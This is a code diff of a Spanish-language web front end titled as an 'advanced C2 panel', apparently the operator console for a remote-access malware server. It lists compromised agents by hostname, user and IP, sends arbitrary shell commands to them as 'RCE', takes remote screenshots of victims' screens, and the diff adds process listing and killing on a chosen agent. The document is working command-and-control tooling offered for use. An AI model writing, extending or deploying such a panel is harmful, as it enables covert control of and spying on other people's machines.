@@ -1,10 +1,9 @@
-<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>G3-FLASH | ADVANCED C2 PANEL</title>
-    
+
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -17,51 +16,66 @@
             --bg-dark: #0b0e14;
         }
 
-        body { 
-            background-color: var(--bg-dark); 
-            color: var(--neon-green); 
-            font-family: 'Fira Code', monospace; 
+        body {
+            background-color: var(--bg-dark);
+            color: var(--neon-green);
+            font-family: 'Fira Code', monospace;
         }
 
-        .main-container { 
-            border: 1px solid #1a1f29; 
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); 
-            background: rgba(16, 20, 28, 0.9); 
-            border-radius: 8px; 
-            padding: 25px; 
+        .main-container {
+            border: 1px solid #1a1f29;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            background: rgba(16, 20, 28, 0.9);
+            border-radius: 8px;
+            padding: 25px;
             margin-top: 20px;
+        }
+
+        /* Tabs Styling */
+        .nav-tabs { border-bottom: 1px solid #1a1f29; }
+        .nav-tabs .nav-link { 
+            color: var(--neon-blue) !important; 
+            border: none !important;
+            border-bottom: 2px solid transparent !important;
+            transition: 0.3s;
+        }
+        .nav-tabs .nav-link.active { 
+            background: transparent !important; 
+            border-bottom: 2px solid var(--neon-blue) !important; 
+            font-weight: bold;
+            text-shadow: 0 0 8px var(--neon-blue);
         }
 
         /* Tabla Estilo Matrix */
         .table { color: var(--neon-green); border-color: #1a1f29; vertical-align: middle; }
-        .table thead th { 
-            border-bottom: 2px solid var(--neon-green); 
-            text-transform: uppercase; 
-            font-size: 0.8rem; 
-            color: var(--neon-blue); 
+        .table thead th {
+            border-bottom: 2px solid var(--neon-green);
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            color: var(--neon-blue);
         }
 
         /* Inputs y Terminal */
-        .form-control { 
-            background-color: #05070a; 
-            border: 1px solid var(--neon-green); 
-            color: var(--neon-green); 
+        .form-control {
+            background-color: #05070a;
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
             font-size: 0.9rem;
         }
-        .form-control:focus { 
-            background-color: #05070a; 
-            color: var(--neon-green); 
-            border-color: var(--neon-blue); 
-            box-shadow: 0 0 10px rgba(0, 212, 255, 0.4); 
+        .form-control:focus {
+            background-color: #05070a;
+            color: var(--neon-green);
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.4);
         }
 
-        pre.respuesta-text { 
-            background: #000; 
-            border-left: 3px solid var(--neon-blue); 
-            padding: 12px; 
-            max-height: 150px; 
-            overflow-y: auto; 
-            color: #a0a0a0; 
+        pre.respuesta-text {
+            background: #000;
+            border-left: 3px solid var(--neon-blue);
+            padding: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            color: #a0a0a0;
             font-size: 0.8rem;
             white-space: pre-wrap;
         }
@@ -69,16 +83,16 @@
         /* Botones Neón */
         .btn-danger { background: transparent; border: 1px solid var(--neon-red); color: var(--neon-red); }
         .btn-danger:hover { background: var(--neon-red); color: white; box-shadow: 0 0 15px var(--neon-red); }
-        
+
         .btn-info { background: transparent; border: 1px solid var(--neon-blue); color: var(--neon-blue); }
         .btn-info:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 15px var(--neon-blue); }
 
-        .status-dot { 
-            height: 10px; width: 10px; 
-            background-color: var(--neon-green); 
-            border-radius: 50%; 
-            display: inline-block; 
-            margin-right: 5px; 
+        .status-dot {
+            height: 10px; width: 10px;
+            background-color: var(--neon-green);
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
             box-shadow: 0 0 8px var(--neon-green);
             animation: pulse 2s infinite;
         }
@@ -89,14 +103,8 @@
             100% { opacity: 1; }
         }
 
-        /* Modal Tuning */
         .modal-content { background-color: var(--bg-dark); border: 1px solid var(--neon-blue); }
         .modal-header { border-bottom: 1px solid #1a1f29; }
-        #imgVisor { 
-            max-width: 100%; 
-            border-radius: 4px; 
-            transition: opacity 0.3s ease-in-out;
-        }
     </style>
 </head>
 <body class="p-4">
@@ -112,21 +120,71 @@
             </div>
         </div>
 
-        <div class="table-responsive">
-            <table class="table table-dark">
-                <thead>
-                    <tr>
-                        <th><i class="fas fa-id-badge"></i> ID</th>
-                        <th><i class="fas fa-desktop"></i> Hostname</th>
-                        <th><i class="fas fa-user"></i> User</th>
-                        <th><i class="fas fa-network-wired"></i> IP Address</th>
-                        <th><i class="fas fa-code"></i> Last Output</th>
-                        <th style="width: 350px;"><i class="fas fa-microchip"></i> Operations</th>
-                    </tr>
-                </thead>
-                <tbody id="tabla-agentes">
-                    </tbody>
-            </table>
+        <ul class="nav nav-tabs mb-4" id="c2Tabs" role="tablist">
+            <li class="nav-item">
+                <button class="nav-link active" id="agents-tab" data-bs-toggle="tab" data-bs-target="#agents-view" type="button">
+                    <i class="fas fa-network-wired"></i> GESTIÓN DE AGENTES
+                </button>
+            </li>
+            <li class="nav-item">
+                <button class="nav-link" id="tools-tab" data-bs-toggle="tab" data-bs-target="#tools-view" type="button">
+                    <i class="fas fa-cogs"></i> SYSTEM TOOLS
+                </button>
+            </li>
+        </ul>
+
+        <div class="tab-content">
+            <div class="tab-pane fade show active" id="agents-view" role="tabpanel">
+                <div class="table-responsive">
+                    <table class="table table-dark">
+                        <thead>
+                            <tr>
+                                <th><i class="fas fa-id-badge"></i> ID</th>
+                                <th><i class="fas fa-desktop"></i> Hostname</th>
+                                <th><i class="fas fa-user"></i> User</th>
+                                <th><i class="fas fa-network-wired"></i> IP</th>
+                                <th><i class="fas fa-code"></i> Last Output</th>
+                                <th style="width: 350px;"><i class="fas fa-microchip"></i> Operations</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tabla-agentes"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="tools-view" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-info text-info mb-3">
+                            <div class="card-header border-info bg-transparent">⚙️ Control de Procesos</div>
+                            <div class="card-body">
+                                <label class="small mb-1">ID del Agente Target:</label>
+                                <input type="number" id="target-id" class="form-control mb-3" placeholder="Ej: 0">
+                                
+                                <button class="btn btn-info w-100 mb-3" onclick="pedirProcesos()">
+                                    <i class="fas fa-list"></i> LISTAR PROCESOS (ps)
+                                </button>
+
+                                <label class="small mb-1">Cerrar proceso por PID:</label>
+                                <div class="input-group">
+                                    <input type="text" id="kill-pid" class="form-control" placeholder="PID">
+                                    <button class="btn btn-danger" onclick="matarProceso()">
+                                        <i class="fas fa-skull"></i> KILL
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-8">
+                        <div class="card bg-dark border-info text-info">
+                            <div class="card-header border-info bg-transparent">📋 Lista de Procesos del Sistema</div>
+                            <div class="card-body p-0">
+                                <pre id="process-output" class="respuesta-text m-0" style="max-height: 450px; height: 450px; color: var(--neon-green); border:none;">Selecciona un agente y dale a "Listar Procesos"...</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -150,7 +208,7 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
     <script>
-    // --- FUNCIÓN: ACTUALIZAR LISTA DE AGENTES ---
+    // --- ACTUALIZAR LISTA DE AGENTES ---
     async function actualizarAgentes() {
         try {
             const response = await fetch('/api/agentes');
@@ -159,15 +217,12 @@
 
             agentes.forEach(agente => {
                 let filaExistente = document.getElementById(`fila-${agente.id}`);
-
                 if (filaExistente) {
-                    // Solo actualizamos el log si hay cambios (evita parpadeo)
                     const celdaRespuesta = filaExistente.querySelector('.respuesta-text');
                     if (celdaRespuesta.innerText !== agente.resultado) {
                         celdaRespuesta.innerText = agente.resultado;
                     }
                 } else {
-                    // Creamos fila si el agente es nuevo
                     const nuevaFila = `
                         <tr id="fila-${agente.id}">
                             <td><span class="badge bg-secondary">${agente.id}</span></td>
@@ -178,31 +233,24 @@
                             <td>
                                 <div class="input-group">
                                     <input type="text" id="cmd-${agente.id}" class="form-control form-control-sm" placeholder="shell@c2:~#">
-                                    <button class="btn btn-sm btn-info" onclick="verScreenshot(${agente.id})" title="Capturar Pantalla">
-                                        <i class="fas fa-camera"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-danger" onclick="enviarComando(${agente.id})" title="Enviar Comando">
-                                        <i class="fas fa-paper-plane"></i>
-                                    </button>
+                                    <button class="btn btn-sm btn-info" onclick="verScreenshot(${agente.id})"><i class="fas fa-camera"></i></button>
+                                    <button class="btn btn-sm btn-danger" onclick="enviarComando(${agente.id})"><i class="fas fa-paper-plane"></i></button>
                                 </div>
                             </td>
-                        </tr>
-                    `;
+                        </tr>`;
                     tabla.insertAdjacentHTML('beforeend', nuevaFila);
                 }
             });
         } catch (error) { console.error("Error Polling:", error); }
     }
 
-    // --- FUNCIÓN: CAPTURA DE PANTALLA ---
+    // --- CAPTURA DE PANTALLA ---
     async function verScreenshot(id) {
         const visor = document.getElementById('imgVisor');
         const loader = document.getElementById('loaderImg');
-        
-        // Efecto visual de carga
         loader.style.display = "block";
         visor.style.opacity = "0.2";
-        
+
         const formData = new FormData();
         formData.append('id', id);
         formData.append('comando', 'screenshot');
@@ -210,57 +258,70 @@
         try {
             const response = await fetch('/ejecutar', { method: 'POST', body: formData });
             const data = await response.json();
-
             if (data.status === "success") {
-                // El timestamp es vital para saltar la caché del navegador
                 const timestamp = new Date().getTime();
                 const nuevaUrl = `/screenshots/screen_${id}.jpg?t=${timestamp}`;
-                
-                // Pre-cargamos la imagen antes de mostrarla
                 const imgTemp = new Image();
                 imgTemp.src = nuevaUrl;
                 imgTemp.onload = () => {
                     visor.src = nuevaUrl;
                     visor.style.opacity = "1";
                     loader.style.display = "none";
-                    
-                    // Abrir modal
-                    const modalElement = document.getElementById('screenshotModal');
-                    const myModal = bootstrap.Modal.getOrCreateInstance(modalElement);
-                    myModal.show();
+                    new bootstrap.Modal(document.getElementById('screenshotModal')).show();
                 };
-            } else {
-                alert("Agente Offline o Error: " + data.resultado);
-                loader.style.display = "none";
             }
-        } catch (e) {
-            console.error("Error Screenshot:", e);
-            loader.style.display = "none";
-        }
+        } catch (e) { loader.style.display = "none"; }
     }
 
-    // --- FUNCIÓN: ENVIAR COMANDOS RCE ---
+    // --- ENVIAR COMANDOS RCE ---
     async function enviarComando(id) {
         const inputCmd = document.getElementById(`cmd-${id}`);
         const cmd = inputCmd.value;
         if (!cmd) return;
-
         const formData = new FormData();
         formData.append('id', id);
         formData.append('comando', cmd);
-        
-        // Limpiamos input inmediatamente para UX
         inputCmd.value = '';
+        await fetch('/ejecutar', { method: 'POST', body: formData });
+    }
+
+    // --- PACK HERRAMIENTAS: PROCESOS ---
+    async function pedirProcesos() {
+        const id = document.getElementById('target-id').value;
+        if(!id) return alert("Ingresa el ID del agente");
+        
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('comando', 'ps');
+
+        document.getElementById('process-output').innerText = "Solicitando lista al agente...";
 
         try {
             await fetch('/ejecutar', { method: 'POST', body: formData });
-            actualizarAgentes(); // Forzar actualización rápida
-        } catch (e) { console.error("Error Command:", e); }
+            // Esperamos un segundo a que el agente procese y actualizamos
+            setTimeout(async () => {
+                const res = await fetch('/api/agentes');
+                const agentes = await res.json();
+                const agente = agentes.find(a => a.id == id);
+                document.getElementById('process-output').innerText = agente.resultado;
+            }, 1500);
+        } catch (e) { console.error(e); }
     }
 
-    // Bucle de actualización (cada 3 segundos)
+    async function matarProceso() {
+        const id = document.getElementById('target-id').value;
+        const pid = document.getElementById('kill-pid').value;
+        if(!id || !pid) return alert("Falta ID o PID");
+
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('comando', `kill ${pid}`);
+        await fetch('/ejecutar', { method: 'POST', body: formData });
+        alert("Orden de terminación enviada.");
+    }
+
     setInterval(actualizarAgentes, 3000);
-    actualizarAgentes(); // Carga inicial
+    actualizarAgentes();
     </script>
 </body>
 </html>
